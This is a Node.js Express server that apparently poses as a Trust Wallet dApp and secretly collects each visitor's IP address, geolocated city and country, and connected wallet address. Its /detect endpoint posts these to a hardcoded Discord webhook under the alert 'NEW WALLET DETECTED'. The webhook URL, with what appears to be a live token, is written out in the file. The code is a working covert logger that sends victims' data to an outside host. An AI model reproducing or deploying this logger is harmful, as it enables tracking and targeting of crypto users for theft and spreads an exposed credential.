const express = require('express');
const axios = require('axios');
const requestIp = require('request-ip');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// ⭐⭐⭐ PUT YOUR DISCORD WEBHOOK URL HERE ⭐⭐⭐
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1459213607219892245/M_dBdrlpBILx4BNIW3mfxfnc7EHPxXNSe9xNArkl4q_3dc6_ejbKy0ojgRJ4yoeozfVp";
// ⭐⭐⭐ REPLACE WITH YOUR ACTUAL DISCORD WEBHOOK ⭐⭐⭐

// Get IP address
app.use(requestIp.mw());

// Serve HTML file
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// API endpoint that gets called automatically
app.get('/detect', async (req, res) => {
    try {
        const clientIp = req.clientIp;
        const walletAddress = req.query.wallet; // from Trust Wallet
        
        // Get IP location
        let location = "Unknown";
        try {
            const ipResponse = await axios.get(`https://ipapi.co/${clientIp}/json/`);
            location = `${ipResponse.data.city || 'Unknown'}, ${ipResponse.data.country_name || 'Unknown'}`;
        } catch (err) {
            console.log("Could not get location");
        }

        // Prepare data for Discord
        const discordData = {
            content: `🚨 **NEW WALLET DETECTED** 🚨`,
            embeds: [{
                title: "Trust Wallet Access",
                color: 0x00ff00,
                fields: [
                    {
                        name: "👛 Wallet Address",
                        value: walletAddress ? `\`${walletAddress}\`` : "Not connected",
                        inline: false
                    },
                    {
                        name: "🌐 IP Address",
                        value: `\`${clientIp}\``,
                        inline: true
                    },
                    {
                        name: "📍 Location",
                        value: location,
                        inline: true
                    },
                    {
                        name: "🕒 Time",
                        value: new Date().toLocaleString(),
                        inline: true
                    }
                ],
                footer: {
                    text: "Auto-detected by Trust Wallet dApp"
                }
            }]
        };

        // Send to Discord webhook
        if (DISCORD_WEBHOOK_URL && walletAddress) {
            await axios.post(DISCORD_WEBHOOK_URL, discordData);
            console.log("✅ Sent to Discord:", walletAddress, clientIp);
        }

        // Send response to browser
        res.json({
            success: true,
            ip: clientIp,
            location: location,
            wallet: walletAddress,
            message: walletAddress ? "Data sent to Discord!" : "No wallet connected"
        });

    } catch (error) {
        console.error("Error:", error);
        res.status(500).json({ error: "Something went wrong" });
    }
});

// Start server
app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`✅ Discord Webhook: ${DISCORD_WEBHOOK_URL ? "SET" : "NOT SET"}`);
});
